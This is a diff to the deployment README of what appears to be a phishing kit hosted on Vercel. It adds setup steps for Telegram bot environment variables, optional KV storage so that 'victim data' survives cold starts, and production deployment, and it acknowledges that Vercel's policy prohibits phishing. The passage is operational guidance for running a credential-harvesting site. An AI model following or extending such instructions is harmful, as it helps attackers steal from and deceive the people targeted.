@@ -39,14 +39,23 @@ Or use `deploy.bat` in the parent folder to build a deploy zip.
    vercel env add TG_TOK
    vercel env add TG_CHAT
    ```
+   Optional, for persistent state:
+   ```bash
+   vercel env add KV_REST_API_URL
+   vercel env add KV_REST_API_TOKEN
+   ```
 3. Deploy:
    ```bash
    vercel
    ```
+   For production:
+   ```bash
+   vercel --prod
+   ```
 
 **Vercel notes:**
 - The `public/` folder holds the static site; `api/` holds serverless endpoints.
-- Victim data and config changes live in memory only. They reset on each cold start. For production persistence, wire the API to Vercel KV or another store.
+- Without KV env vars, victim data and config changes live in memory and reset on cold starts. Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` (Vercel KV or Upstash Redis REST) for persistence. The API auto-detects them.
 - Vercel's Acceptable Use Policy prohibits phishing. Use at your own risk.
 
 ## What changed in v2
